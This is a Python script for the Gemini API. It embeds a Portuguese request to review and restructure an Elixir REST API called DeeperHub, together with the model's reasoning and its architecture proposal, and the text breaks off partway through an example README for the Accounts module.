# To run this code you need to install the following dependencies:
# pip install google-genai

import base64
import os
from google import genai
from google.genai import types


def generate():
    client = genai.Client(
        api_key=os.environ.get("GEMINI_API_KEY"),
    )

    files = [
        # Please ensure that the file is available in local system working direrctory or change the file path.
        client.files.upload(file="modules_documentation.txt"),
    ]
    model = "gemini-2.5-pro-preview-05-06"
    contents = [
        types.Content(
            role="user",
            parts=[
                types.Part.from_uri(
                    file_uri=files[0].uri,
                    mime_type=files[0].mime_type,
                ),
                types.Part.from_text(text="""pedi para uma IA construir uma RestAPI em Elixir pra mim, este foi o resultado de tudo o que ela criou. Por favor quero que você imagine construirmos um novo sistema do zero com todas estas features e quero que além de avaliar  e revisar todas as categorias, estruturas de pastas, nomes de módulos e integração dos módulos entre si, adicione também para cada módulo as novas funcionalidades que achar necessário para um sistema sólido em produção com tudo integrado. Eu quero que dentro de Core você adicione todos os módulos que serão necessários para uma boa integração e completude do sistema e que outros módulos dependerão deles para se integrar e funcionar.  Inicialmente avalie o material que tem deste arquivo texto, construa um resumo de um novo sistema e diga o que faria de diferente primeiro"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Here's a breakdown of the thinking process to generate the DeeperHub system analysis and README generation plan:

1.  **Understand the Core Request:** The user wants me to act as a system architect and documentation specialist. They've provided a large dump of Elixir module documentation for a system called \"DeeperHub\". The key tasks are:
    *   Analyze the existing modules.
    *   Propose a new system structure (if needed) with improvements.
    *   Identify core modules and their dependencies.
    *   Suggest new functionalities for a robust production system.
    *   Outline a plan to generate READMEs for each module.

2.  **Initial Skim and High-Level Categorization:**
    *   The `modules_documentation.txt` is extensive. I need to quickly identify major functional areas.
    *   Keywords like \"API\", \"Accounts\", \"Auth\", \"Audit\", \"BackgroundTasks\", \"Biometrics\", \"Console\", \"Core\", \"FeatureFlags\", \"LoginLocation\", \"MFA\", \"Mailer\", \"Metrics\", \"Notifications\", \"OAuth\", \"RBAC\", \"Recovery\", \"Security\", \"SessionPolicy\", \"Services\", \"Shared\", \"Tokens\", \"WebAuthn\", \"Webhooks\" stand out.
    *   \"Facade\" and \"Adapter\" patterns are prevalent, suggesting a layered architecture.
    *   \"Supervisor\" indicates OTP principles are being used.
    *   \"Schema\" implies Ecto and database interaction.
    *   \"Telemetry\" and \"Metrics\" point to observability.

3.  **Detailed Analysis - Module by Module (Mental or Scratchpad):**
    *   **API Group (`Elixir.DeeperHub.API.*`):**
        *   `RateLimit`: Facade, Registry, Supervisor, RateLimiter (Token Bucket). Seems like a good, isolated rate-limiting system.
        *   `Validation`: APIRequestValidator. Essential for input validation.
    *   **Accounts Group (`Elixir.DeeperHub.Accounts.*`):** This is a large one.
        *   `Accounts` (Facade): Central entry point. Good.
        *   `AccountManager`: Seems to be an older facade, potentially redundant given `DeeperHub.Accounts`. The `DelegationStructure` module confirms this refactoring.
        *   `FeatureFlags`: Specific to accounts, good separation.
        *   `Integrations.EventIntegration`: For publishing account-related events. Good.
        *   `Profile`, `Schema.*` (Profile, Session, User): Data models and related logic.
        *   `Services.*` (AuthService, EmailVerificationWorker, PasswordService, ProfileService, RegistrationService, SessionCleanupWorker, UserService): Specific business logic. This is a good breakdown.
        *   `Session`, `SessionManager`: Session management.
        *   `Supervisor`: OTP supervision.
        *   `TokenService`: For various token types (API, email, password reset, invitation).
        *   `User`: User schema/logic.
        *   `UserService`: (Duplicate of `Accounts.Services.UserService`?) - Need to check if this is a distinct entry point or a naming convention issue. The content looks very similar to the AccountManager's old responsibilities. The `DeeperHub.Accounts` facade likely calls this.
    *   **Application (`Elixir.DeeperHub.Application.*`):**
        *   `ApplicationFacade`, `ApplicationModule`: High-level application state/info.
    *   **Audit (`Elixir.DeeperHub.Audit.*`):** Comprehensive.
        *   Facade, Adapters, Behaviour, Event, Log, StatisticsCache, FeatureFlags, Integrations, Policies, Scheduler, Services, Supervisor, Telemetry, Workers. A very well-structured and complete auditing system.
    *   **Auth (`Elixir.DeeperHub.Auth.*`):** Another large one.
        *   Facade, Adapters (Auth, Authorization, Password, RateLimit, Session, Token), Behaviours, Integrations, PermissionService, RoleService, Schemas, Services, Supervisor, TemporaryPassword, Token, Validation, Workers. This seems to overlap significantly with `Accounts`. `Auth` might be the lower-level authentication/authorization mechanics, while `Accounts` is the higher-level user lifecycle management. The presence of `SessionAdapter` here and `SessionManager` in `Accounts` needs clarification or consolidation.
    *   **BackgroundTasks (`Elixir.DeeperHub.BackgroundTasks.*`):**
        *   Facades, Adapters, Behaviours, Cache, Integrations, Services, Supervisor, Telemetry. Well-structured background task system.
    *   **Biometrics (`Elixir.DeeperHub.Biometrics.*`):**
        *   Facade, Adapters, Behaviours, Cache, FeatureFlags, Integrations, Schemas, Services, Supervisor, Telemetry, Workers. Complete biometrics system.
    *   **Console (`Elixir.DeeperHub.Console.*`):**
        *   Facade, Adapters, Behaviours, Commands, Config, Integrations, Services, Supervisor, Telemetry. CLI interface.
    *   **Core (`Elixir.DeeperHub.Core.*`):**
        *   `AdapterBehaviour`: Base for adapters.
        *   `ApiResponder`: JSON response formatting.
        *   `ConfigManager`: Central configuration. Good.
        *   `Event`, `EventBus`, `EventSupervisor`: Pub/sub system. Good.
        *   `LoggerFacade`, `Services.InitialConfigStore`, `Services.LoggerFacade`: Logging infrastructure. The duplication of `LoggerFacade` needs to be addressed (likely alias).
        *   `MetricsFacade`: Metrics.
        *   `Notifications.*`: Notifications infrastructure.
    *   **Domain (`Elixir.DeeperHub.Domain.*`):**
        *   `FeatureFlags.*`: Domain-specific feature flags (Messaging, ServerReviews, Support, UserProfiles). Good.
        *   `Integrations.EventIntegration`: Domain event publishing.
    *   **FeatureFlags (`Elixir.DeeperHub.FeatureFlags.*`):** General feature flag system.
        *   Adapters, Behaviour, Cache, Extensions, Facade, Initializer, Integrations, Services, Supervisor, Telemetry, UnifiedFacade. Very comprehensive.
    *   **Infrastructure (`Elixir.DeeperHub.Infrastructure.*`):**
        *   `GeoIP`, `SMTP`: External service integrations with circuit breakers. Excellent.
    *   **Inspector (`Elixir.DeeperHub.Inspector.*`):** Code introspection tools. Useful for dev/docs.
    *   **Logger (`Elixir.DeeperHub.Logger.*`):** (Duplicate of `Core.LoggerFacade`?) - Looks like the actual logging implementation.
    *   **LoginLocation (`Elixir.DeeperHub.LoginLocation.*`):** Login location tracking. Good for security.
    *   **MFA (`Elixir.DeeperHub.MFA.*`):** Multi-factor authentication.
    *   **Mailer (`Elixir.DeeperHub.Mailer.*`):** Email sending.
    *   **ModuleInspector (`Elixir.DeeperHub.ModuleInspector.*`):** (Duplicate of `Inspector`?) Seems to be an older or simpler version.
    *   **Notifications (`Elixir.DeeperHub.Notifications.*`):** (Duplicate of `Core.NotificationsFacade`?) Looks like the actual notification implementation.
    *   **OAuth (`Elixir.DeeperHub.OAuth.*`):** OAuth integration.
    *   **RBAC (`Elixir.DeeperHub.RBAC.*`):** Role-Based Access Control.
    *   **Recovery (`Elixir.DeeperHub.Recovery.*`):** Account recovery.
    *   **Repo (`Elixir.DeeperHub.Repo`):** Main Ecto repo.
    *   **Security (`Elixir.DeeperHub.Security.*`):** Broad security features.
        *   Adapters, AdminAuth, BehavioralAnalysis, BruteForceProtection, CSRFProtection, Cache, Config, DataMasking, DdosProtection, Device, DeviceFingerprint, FeatureFlags, FraudDetection, GeoLocationService, Hashing, Integrations, IntrusionDetection, LogSanitizer, Monitoring, PathTraversalProtection, Plugs, Policy, ResponseSanitizer, RiskAssessment, SQLInjectionProtection, Supervisor, Telemetry, UnifiedSupervisor, Validation, XssProtection. Very extensive security module.
    *   **Services (`Elixir.DeeperHub.Services.*`):** Seems to be a dumping ground for various domain services.
        *   Achievements, Cache, Challenges, Lists, Rewards, Search, ServerAdvertisements, ServerAlerts, ServerEvents, ServerPackages, ServerReviews, ServerTags, ServerUpdateMessages, Servers, Shared, Social, Support, UserInteractions. This needs better organization, perhaps into distinct top-level domains.
    *   **SessionPolicy (`Elixir.DeeperHub.SessionPolicy.*`):** Session policy management.
    *   **Shared (`Elixir.DeeperHub.Shared.*`):** Utilities and shared components.
        *   Cache, CircuitBreaker, Database, Encryption, Formatters, Logging, Metrics, Notifications, RateLimiter, Supervisor, Utils, Validation. Good to have shared utilities. The `Notifications` here might be an older version or internal component.
    *   **TemporaryPassword (`Elixir.DeeperHub.TemporaryPassword.*`):** Temporary password management.
    *   **Tokens (`Elixir.DeeperHub.Tokens.*`):** Token management (JWT, API).
    *   **WebAuthn (`Elixir.DeeperHub.WebAuthn.*`):** WebAuthn implementation.
    *   **Webhooks (`Elixir.DeeperHub.Webhooks.*`):** Webhook system.

4.  **Identify Redundancies and Areas for Improvement:**
    *   **Module Naming/Organization:**
        *   `DeeperHub.Accounts.UserService` vs `DeeperHub.UserService` - Likely consolidation.
        *   `DeeperHub.Core.LoggerFacade` vs `DeeperHub.Logger` vs `DeeperHub.Shared.Logging.StructuredLogger`. The structure is a bit confusing. A single `DeeperHub.Logging` facade with internal services would be cleaner.
        *   `DeeperHub.Core.NotificationsFacade` vs `DeeperHub.Notifications` vs `DeeperHub.Shared.Notifications`. Similar to logging, needs consolidation.
        *   `DeeperHub.Inspector` vs `DeeperHub.ModuleInspector`. Consolidate.
        *   The `DeeperHub.Services.*` namespace is too broad. These should be top-level domains (e.g., `DeeperHub.Servers`, `DeeperHub.Achievements`, `DeeperHub.UserInteractions`).
    *   **Overlapping Functionality:**
        *   `Accounts` and `Auth` have significant overlap. `Auth` should ideally be the core engine, and `Accounts` the user-facing lifecycle management. The documentation needs to make this distinction clear or the modules need refactoring for clearer separation of concerns. For instance, `Auth.TokenService` and `Accounts.TokenService` need to be reconciled.
    *   **Facade/Adapter Usage:** Generally good, but ensure consistency. Unified facades (`*UnifiedFacade`) are interesting; they might represent an evolution or an attempt to simplify a complex underlying structure.

5.  **Propose a New System Structure (High-Level):**
    *   **Core Modules:** These are foundational and used by many others.
        *   `DeeperHub.Core.ConfigManager`
        *   `DeeperHub.Core.EventBus` (centralized from `Core.Event`)
        *   `DeeperHub.Core.Logger` (centralized logging facade)
        *   `DeeperHub.Core.Metrics` (centralized metrics facade)
        *   `DeeperHub.Core.Repo` (main Ecto Repo)
        *   `DeeperHub.Core.BackgroundTaskManager` (from `BackgroundTasks`)
        *   `DeeperHub.Core.CircuitBreaker` (from `Shared.CircuitBreaker`)
        *   `DeeperHub.Core.Cache` (from `Shared.Cache`)
        *   `DeeperHub.Core.Encryption` (from `Shared.Encryption`)
        *   `DeeperHub.Core.HTTPClient` (New, for abstracting HTTP calls, potentially with circuit breaker integration)
    *   **Application Modules (Domains):** These represent major business capabilities.
        *   `DeeperHub.Accounts` (User lifecycle, profiles)
        *   `DeeperHub.Auth` (Authentication engine, MFA, WebAuthn, OAuth, Tokens, SessionPolicy, Recovery, TemporaryPassword, SecurityQuestions) - *This is still very large. Further breakdown might be needed, or `Accounts` could absorb more of the user-facing aspects of these.*
        *   `DeeperHub.API` (Rate limiting, validation, response formatting)
        *   `DeeperHub.Audit`
        *   `DeeperHub.Notifications`
        *   `DeeperHub.Webhooks`
        *   `DeeperHub.FeatureFlags`
        *   `DeeperHub.RBAC`
        *   `DeeperHub.Security` (FraudDetection, IntrusionDetection, IPFirewall, CSRF, XSS, SQLi, PathTraversal, DataMasking, BehavioralAnalysis, LoginLocation, DeviceFingerprint) - *Also very large, potentially break down further e.g., `DeeperHub.ThreatDetection`, `DeeperHub.DataProtection`.*
        *   `DeeperHub.Servers` (managing game servers, etc.)
        *   `DeeperHub.UserInteractions` (Social features, reviews, messaging)
        *   `DeeperHub.Achievements`
        *   `DeeperHub.Rewards`
        *   `DeeperHub.Challenges`
        *   `DeeperHub.Support`
        *   `DeeperHub.Console`
        *   `DeeperHub.Biometrics`
        *   `DeeperHub.ModuleInspector` (dev tool)
    *   **Shared Utilities:**
        *   `DeeperHub.Shared.Utils` (Date, File, List, Map, Security, String, Validation)
        *   `DeeperHub.Shared.Schemas` (Common, base schemas if any)

6.  **Suggest New Functionalities:**
    *   **Core:**
        *   `HTTPClient`: Abstract HTTP calls, integrate with CircuitBreaker.
        *   `Internationalization (I18n)`: Central service for translations. (Noticed some in Notifications, should be core).
        *   `FeatureFlagging` strategy configuration (e.g., percentage rollouts, user segmentation beyond basic flags).
    *   **Accounts/Auth:**
        *   Passwordless login (Magic Links).
        *   Social Login integration beyond just OAuth (e.g., Apple Sign-In).
        *   Better clarity between `Accounts` and `Auth` responsibilities.
    *   **Security:**
        *   Content Moderation service.
        *   WAF integration points.
        *   Secrets Management integration.
    *   **UserInteractions/Social:**
        *   Friendships, Groups, Activity Feeds.
    *   **General:**
        *   Admin Panel/Dashboard (could leverage `Console` and `Metrics`).
        *   Data Archival/Purging strategies for more modules.
        *   More robust error handling and reporting (e.g., integration with Sentry).

7.  **Address the \"What I'd Do Differently\" Question:**
    *   **Consolidation:** Merge overlapping modules (Logging, Notifications, Auth/Accounts).
    *   **Domain-Driven Structure:** Elevate `DeeperHub.Services.*` into top-level domains.
    *   **Clearer Boundaries:** Define precise responsibilities for `Accounts` vs. `Auth`.
    *   **Core Services:** Identify and centralize more foundational services in `DeeperHub.Core`.
    *   **Documentation First:** Emphasize creating READMEs *as part of* module design, not just after.

8.  **Structure the Output:**
    *   Start with an overall assessment.
    *   Address the \"what I'd do differently\" question.
    *   Propose the new system structure with Core and Application modules.
    *   List suggested new functionalities.
    *   Provide the filled README template for one module as an example (choose a representative one like `Elixir.DeeperHub.Accounts`).
    *   Conclude with a statement about the process of generating READMEs for all modules.

9.  **Refine and Review:**
    *   Read through the generated text. Is it clear, concise, and comprehensive?
    *   Are there any contradictions?
    *   Does it directly answer all parts of the user's request?
    *   Is the tone appropriate (expert, helpful)?
    *   Check for formatting, especially with code blocks and lists.
    *   Ensure emojis are used appropriately as requested.

**(Self-correction during the process):**
*   Initially, I might just list modules. But the user asked for a *new system structure*. So, I need to group them logically.
*   The `Accounts` and `Auth` overlap is a major point. I need to highlight this and suggest a path forward.
*   The `Services` namespace is a clear anti-pattern for larger systems; breaking it down is crucial.
*   When suggesting new features, ensure they are relevant to a \"solid production system.\"
*   The README example should be detailed and follow the user's template accurately. Choosing `DeeperHub.Accounts` is good because it's central and complex.

By following these steps, the aim is to provide a thorough, actionable, and well-structured response that meets the user's request."""),
                types.Part.from_text(text="""Uau! Que material extenso e detalhado! Isso demonstra um sistema com uma arquitetura já bastante pensada e com uma grande separação de responsabilidades. É um excelente ponto de partida.

Vamos analisar o que temos e como podemos organizar e aprimorar para um novo sistema DeeperHub.

## 🚀 Resumo Inicial e Avaliação do Material Existente

O DeeperHub, pelo que vejo, é um sistema complexo com funcionalidades robustas em diversas áreas:

*   **Autenticação e Autorização:** Múltiplos fatores (MFA), WebAuthn, OAuth, Tokens, RBAC, Políticas de Sessão, Perguntas de Segurança.
*   **Gerenciamento de Contas:** Ciclo de vida completo de usuários, perfis.
*   **Segurança:** Detecção de Fraude, Proteção contra Força Bruta, CSRF, DDoS, Injeção de SQL, XSS, Criptografia, Análise Comportamental, Localização de Login, Saneamento de Logs e Respostas.
*   **Core/Infraestrutura:** Configuração, Eventos, Logging, Métricas, Notificações, Cache, Circuit Breaker, Tarefas em Background.
*   **Funcionalidades de Domínio (em `Services`):** Servidores (com pacotes, alertas, eventos, reviews, tags, mensagens de atualização), Conquistas, Desafios, Recompensas, Listas Genéricas, Interações Sociais, Suporte.
*   **Ferramentas de Desenvolvimento:** Console, Inspetor de Módulos.

**Pontos Positivos da Estrutura Atual:**

*   **Separação de Responsabilidades:** Muitos módulos têm um escopo bem definido.
*   **Padrões de Design:** Uso claro de Fachadas (Facades) e Adaptadores, o que é ótimo para desacoplamento.
*   **Segurança Abrangente:** Uma quantidade impressionante de módulos dedicados à segurança.
*   **Observabilidade:** Módulos de Telemetria e Métricas são um bom sinal.
*   **OTP:** Presença de Supervisores indica uso de princípios OTP para resiliência.

**O que eu faria de diferente / Pontos a Refinar (Primeiras Impressões):**

1.  **Estrutura de Pastas/Namespaces:**
    *   O namespace `Elixir.DeeperHub.Services.*` parece um pouco genérico demais e agrupa muitos domínios de negócio distintos (Achievements, Servers, Support, etc.). Eu optaria por elevar cada um desses \"serviços\" a um contexto de domínio de nível superior dentro de `Elixir.DeeperHub.*`. Por exemplo, `Elixir.DeeperHub.Servers`, `Elixir.DeeperHub.Achievements`.
    *   Há uma sobreposição aparente e potencial confusão entre módulos como `DeeperHub.Core.LoggerFacade` e `DeeperHub.Logger`, ou `DeeperHub.Core.NotificationsFacade` e `DeeperHub.Notifications`. Uma estrutura mais clara e única para esses componentes centrais seria benéfica.
    *   O mesmo para `DeeperHub.Auth` e `DeeperHub.Accounts`. Parecem ter responsabilidades que se sobrepõem significativamente. `Auth` poderia ser o motor de autenticação/autorização puro, e `Accounts` o gerenciador do ciclo de vida do usuário que *utiliza* `Auth`.

2.  **Consolidação de Módulos Core:**
    *   Alguns módulos em `DeeperHub.Shared.*` (como Cache, CircuitBreaker, Encryption) são tão fundamentais que poderiam ser parte de um `DeeperHub.Core.Infrastructure` ou similar, para deixar claro que são blocos de construção transversais.
    *   Outros em `Shared` são utilitários (`Utils.*`) e podem permanecer assim, ou serem agrupados de forma mais granular se o `Shared` crescer demais.

3.  **Clarificar Fachadas \"Unificadas\":**
    *   A presença de fachadas como `OAuthFacadeUnified`, `BackgroundTasksFacadeUnified` sugere uma evolução ou tentativa de simplificar interfaces. É importante garantir que a \"unificação\" realmente simplifique e não adicione outra camada de indireção desnecessária. O objetivo de uma fachada é simplificar, então se a fachada original já faz isso bem, a \"unificada\" pode ser redundante.

4.  **Documentação (Objetivo Principal):**
    *   A documentação fornecida já é um bom começo, com descrições de módulos e funções. O objetivo agora é padronizar isso no formato README proposto, detalhando *todas* as características, responsabilidades, APIs, configurações, etc., para cada módulo.

## 🏗️ Proposta de Nova Estrutura de Módulos DeeperHub (Alto Nível)

A ideia é organizar os módulos em contextos de domínio claros e ter um `Core` robusto com componentes transversais bem definidos.

### 🌟 DeeperHub.Core (Componentes Transversais Fundamentais)

Estes são os módulos que fornecem funcionalidades essenciais para todo o sistema. Outros módulos dependerão deles.

1.  **`Core.ConfigManager`**:
    *   Responsável: Gerenciamento centralizado de configurações.
    *   Utilizado por: Praticamente todos os módulos para obter configurações de runtime.
2.  **`Core.EventBus`**:
    *   Responsável: Sistema de publicação e assinatura de eventos (Pub/Sub).
    *   Utilizado por: Módulos que emitem eventos (ex: `Accounts` em `user_created`) e módulos que escutam eventos (ex: `Notifications` para enviar email após `user_created`).
3.  **`Core.Logger`**:
    *   Responsável: Fachada para logging estruturado.
    *   Utilizado por: Todos os módulos para registrar informações, avisos, erros.
4.  **`Core.Metrics`**:
    *   Responsável: Fachada para coleta e exposição de métricas.
    *   Utilizado por: Todos os módulos para registrar métricas de desempenho e saúde.
5.  **`Core.Repo`**:
    *   Responsável: Repositório Ecto principal para interação com o banco de dados.
    *   Utilizado por: Todos os módulos que precisam persistir ou consultar dados.
6.  **`Core.BackgroundTaskManager`**:
    *   Responsável: Gerenciamento e execução de tarefas em background.
    *   Utilizado por: Módulos que precisam executar operações assíncronas (ex: `Mailer` para envio de emails em lote, `Audit` para processamento de logs).
7.  **`Core.CircuitBreakerFactory`**:
    *   Responsável: Criação e gerenciamento de instâncias de Circuit Breakers para serviços externos.
    *   Utilizado por: Módulos que integram com APIs de terceiros (ex: `GeoIPService`, `SMTPService`).
8.  **`Core.Cache`**:
    *   Responsável: Fachada para o sistema de cache (ETS, Redis, etc.).
    *   Utilizado por: Módulos que precisam armazenar/recuperar dados frequentemente acessados para melhorar performance.
9.  **`Core.EncryptionService`**:
    *   Responsável: Criptografia e descriptografia de dados sensíveis, gerenciamento de chaves.
    *   Utilizado por: Módulos que lidam com dados sensíveis (ex: `Accounts` para senhas, `Security.DataMasking`).
10. **`Core.HTTPClient` (Novo Sugerido)**:
    *   Responsável: Abstração para realizar chamadas HTTP externas, integrando-se opcionalmente com `CircuitBreakerFactory`.
    *   Utilizado por: Qualquer módulo que precise fazer chamadas HTTP (ex: `OAuth` para falar com provedores, `Webhooks` para enviar eventos).
11. **`Core.Internationalization (I18n)` (Novo Sugerido)**:
    *   Responsável: Fornecer traduções e localização para a aplicação.
    *   Utilizado por: Módulos que apresentam texto ao usuário (`Notifications`, `API` para mensagens de erro, `Console`).
12. **`Core.APIResponder`**:
    *   Responsável: Padronização de respostas da API REST.
    *   Utilizado por: Todos os controllers da camada de API.
13. **`Core.InputValidator`**:
    *   Responsável: Validação e sanitização genérica de entradas. (Pode absorver `Shared.Validation.InputValidator` e `Shared.Validation.InputSanitizer`).
    *   Utilizado por: Módulos que recebem dados externos, especialmente a camada de API e Console.

### 📦 Módulos de Aplicação/Domínio (Exemplos)

Estes módulos representam as funcionalidades de negócio do DeeperHub.

1.  **`DeeperHub.Accounts`**:
    *   Visão Geral: Gerencia todo o ciclo de vida dos usuários, seus perfis e dados associados.
    *   Funcionalidades Existentes: CRUD de usuários, perfis, gerenciamento de sessão (via `Auth.SessionManager`).
    *   Novas Funcionalidades Sugeridas: Gerenciamento de preferências de usuário mais granular (além de notificações), gestão de consentimento (LGPD/GDPR), histórico de atividades do usuário (além de auditoria, focado no usuário).
2.  **`DeeperHub.Auth`**:
    *   Visão Geral: Responsável por todos os aspectos de autenticação e autorização.
    *   Funcionalidades Existentes: Login (senha, OAuth, WebAuthn), MFA, gerenciamento de tokens (JWT, API, recuperação), políticas de sessão, RBAC, perguntas de segurança.
    *   Novas Funcionalidades Sugeridas: Login com Magic Links, suporte a OpenID Connect, gerenciamento de escopos OAuth mais granular, integração com provedores de identidade externos (SAML).
3.  **`DeeperHub.API`**:
    *   Visão Geral: Define e gerencia a API REST pública do DeeperHub.
    *   Funcionalidades Existentes: Rate Limiting, Validação de Requisições.
    *   Novas Funcionalidades Sugeridas: Versionamento de API, documentação de API interativa (Swagger/OpenAPI) gerada automaticamente, throttling mais avançado (baseado em quotas de usuário/plano).
4.  **`DeeperHub.Audit`**:
    *   Visão Geral: Sistema completo de trilha de auditoria.
    *   Funcionalidades Existentes: Registro de eventos, políticas de retenção, detecção de anomalias, relatórios.
    *   Novas Funcionalidades Sugeridas: Integração com SIEM (Security Information and Event Management) externos, alertas configuráveis para eventos de auditoria específicos.
5.  **`DeeperHub.Notifications`**:
    *   Visão Geral: Gerenciamento e envio de notificações multicanal.
    *   Funcionalidades Existentes: Envio por Email, In-App, Push; templates; preferências de usuário.
    *   Novas Funcionalidades Sugeridas: Suporte a SMS, notificações agregadas/digest, priorização de notificações, log de entrega detalhado por canal.
6.  **`DeeperHub.Webhooks`**:
    *   Visão Geral: Permite que sistemas externos sejam notificados sobre eventos no DeeperHub.
    *   Funcionalidades Existentes: Registro, disparo, monitoramento, assinatura de payloads.
    *   Novas Funcionalidades Sugeridas: Interface de gerenciamento para usuários configurarem seus próprios webhooks, retentativas com backoff exponencial configurável por webhook, log de histórico de entregas por webhook.
7.  **`DeeperHub.FeatureFlags`**:
    *   Visão Geral: Gerenciamento de feature flags para lançamento gradual e testes A/B.
    *   Funcionalidades Existentes: Habilitação/desabilitação, regras, cache, integração RBAC.
    *   Novas Funcionalidades Sugeridas: Segmentação de usuários mais avançada (porcentagem, atributos de usuário), interface de gerenciamento de flags.
8.  **`DeeperHub.Security`**:
    *   Visão Geral: Concentra as diversas camadas de proteção do sistema.
    *   Funcionalidades Existentes: Detecção de Fraude, Proteção contra Força Bruta, CSRF, DDoS, Injeção de SQL, XSS, Criptografia (usando `Core.EncryptionService`), Análise Comportamental, Localização de Login, Saneamento de Logs e Respostas, Gerenciamento de Dispositivos.
    *   Novas Funcionalidades Sugeridas: WAF (Web Application Firewall) plugável, gerenciamento centralizado de políticas de segurança (CSP, HSTS), scanner de vulnerabilidades integrado (ou hooks para integração).
9.  **`DeeperHub.Servers`** (Ex-`Services.Servers`):
    *   Visão Geral: Gerenciamento de entidades \"Servidor\" e seus metadados.
    *   Funcionalidades Existentes: CRUD de servidores, pacotes, alertas, eventos, reviews, tags, mensagens de atualização.
    *   Novas Funcionalidades Sugeridas: Monitoramento de status de servidor (integração com ping/query), estatísticas de uso de servidor, sistema de moderação para conteúdo gerado pelo usuário (reviews, tags).
10. **`DeeperHub.UserInteractions`** (Ex-`Services.UserInteractions`):
    *   Visão Geral: Funcionalidades sociais e de interação entre usuários.
    *   Funcionalidades Existentes: Favoritos, mensagens de chat, recomendações, feedback, denúncias.
    *   Novas Funcionalidades Sugeridas: Sistema de amizades/seguidores, grupos de usuários, feed de atividades.
11. **`DeeperHub.Gamification`** (Agrupando `Achievements`, `Rewards`, `Challenges`):
    *   Visão Geral: Elementos de gamificação da plataforma.
    *   Funcionalidades Existentes: Gerenciamento de conquistas, recompensas, desafios.
    *   Novas Funcionalidades Sugeridas: Leaderboards, sistema de pontos/moedas virtuais.
12. **`DeeperHub.Support`** (Ex-`Services.Support`):
    *   Visão Geral: Sistema de suporte ao cliente/usuário.
    *   Funcionalidades Existentes: Criação e gerenciamento de tickets de suporte.
    *   Novas Funcionalidades Sugeridas: Base de conhecimento (FAQ), integração com chat de suporte ao vivo.
13. **`DeeperHub.Console`**:
    *   Visão Geral: Interface de linha de comando para administração.
    *   Funcionalidades Existentes: Execução de comandos, ajuda, listagem.
    *   Novas Funcionalidades Sugeridas: Scripting de tarefas administrativas, histórico de comandos persistente.
14. **`DeeperHub.Biometrics`**:
    *   Visão Geral: Autenticação e análise comportamental baseada em biometria.
    *   Funcionalidades Existentes: Captura, análise, verificação, detecção de anomalias.
    *   Novas Funcionalidades Sugeridas: Suporte a mais tipos de dados biométricos, políticas de consentimento para coleta de dados biométricos.
15. **`DeeperHub.ModuleInspector`**:
    *   Visão Geral: Ferramenta de desenvolvimento para inspecionar a estrutura do código.
    *   Funcionalidades Existentes: Inspeção de módulos, funções, typespecs.
    *   Novas Funcionalidades Sugeridas: Geração de diagramas de dependência, análise de cobertura de documentação.
16. **`DeeperHub.GeoIP`** (Ex-`Infrastructure.GeoIP`):
    *   Visão Geral: Serviço de geolocalização de IPs.
    *   Funcionalidades Existentes: Lookup de IP com Circuit Breaker.
    *   Novas Funcionalidades Sugeridas: Atualização automática de base de dados GeoIP local (se usada como fallback).
17. **`DeeperHub.Mailer`** (Ex-`Infrastructure.SMTP` e `Mailer`):
    *   Visão Geral: Serviço de envio de emails.
    *   Funcionalidades Existentes: Envio de email com Circuit Breaker.
    *   Novas Funcionalidades Sugeridas: Suporte a múltiplos provedores SMTP, templates de email (se não cobertos por `Notifications`).

### 🛠️ Utilitários Compartilhados

*   **`DeeperHub.Shared.Utils`**: `DateUtils`, `FileUtils`, `ListUtils`, `MapUtils`, `SecurityUtils`, `StringUtils`, `ValidationUtils`.

## 📝 Exemplo de README para um Módulo (DeeperHub.Accounts)

Com base na sua estrutura e no material fornecido, vamos preencher o template para o módulo `Elixir.DeeperHub.Accounts`.

---

# Módulo: `Elixir.DeeperHub.Accounts` 🚀

## 📜 1. Visão Geral do Módulo `Elixir.DeeperHub.Accounts`

O módulo `DeeperHub.Accounts` é a fachada principal e ponto de entrada para todas as operações relacionadas ao gerenciamento do ciclo de vida de contas de usuário e seus perfis associados no sistema DeeperHub. Ele orquestra funcionalidades como registro, autenticação (delegando para `DeeperHub.Auth`), gerenciamento de perfis, e outras operações pertinentes à conta do usuário. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento do Ciclo de Vida do Usuário:**
    *   Criação de novas contas de usuário (`create_user/1`).
    *   Registro completo de usuário com perfil (`register_user/1`).
    *   Busca de usuários por ID (`get_user/1`) ou email (`get_user_by_email/1`).
    *   Listagem de usuários com filtros e paginação (`list_users/1`).
    *   Contagem de usuários ativos, bloqueados e registros recentes (via `DeeperHub.Accounts.AccountManager` ou `DeeperHub.Accounts.Services.UserService`).
*   **Autenticação de Usuário (Delegação):**
    *   Autenticação com email e senha (`authenticate/5`).
    *   Início do processo de autenticação WebAuthn (`begin_webauthn_authentication/1`).
    *   Verificação de segundo fator de autenticação (`verify_second_factor/4`).
*   **Gerenciamento de Perfil do Usuário:**
    *   Criação de perfis de usuário (`create_profile/2`).
    *   Obtenção de perfis de usuário (`get_profile/1`).
    *   Atualização de perfis de usuário (`update_profile/2`).
    *   Gerenciamento de preferências de notificação (via `DeeperHub.Accounts.AccountManager`).
    *   Formatação de nomes e cálculo de idade (via `DeeperHub.Accounts.Profile`).
*   **Gerenciamento de Senha (Delegação):**
    *   Atualização de senha do usuário (`update_password/3`).
*   **Verificação de Email (Delegação):**
    *   Confirmação de endereço de email (`confirm_email/2`).
    *   Reenvio de email de verificação (`resend_verification_email/1`).
*   **Gerenciamento de Sessões (Delegação):**
    *   Limpeza de sessões expiradas (`cleanup_sessions/0`).
*   **Feature Flags Específicas de Contas:**
    *   Verificação de flags como `registration_enabled?`, `email_verification_enabled?` (via `DeeperHub.Accounts.FeatureFlags`).
*   **Integração de Eventos:**
    *   Publicação de eventos como `user_created`, `user_updated`, `email_verified` (via `DeeperHub.Accounts.Integrations.EventIntegration`).

## 🏗️ 3. Arquitetura e Design

O módulo `DeeperHub.Accounts` atua como uma **Fachada (Facade)**, simplificando a interface para um conjunto complexo de subsistemas e serviços relacionados a contas. Ele delega as responsabilidades para módulos de serviço mais específicos, como:

*   `DeeperHub.Accounts.Services.UserService`: Lida com operações CRUD de usuários.
*   `DeeperHub.Accounts.Services.ProfileService`: Gerencia perfis de usuários.
*   `DeeperHub.Auth.Services.AuthService` (via delegação): Lida com autenticação.
*   `DeeperHub.Auth.Services.PasswordService` (via delegação): Gerencia senhas.
*   `DeeperHub.Accounts.Services.RegistrationService`: Orquestra o processo de registro.
*   `DeeperHub.Accounts.Services.SessionCleanupWorker`: Limpeza de sessões.
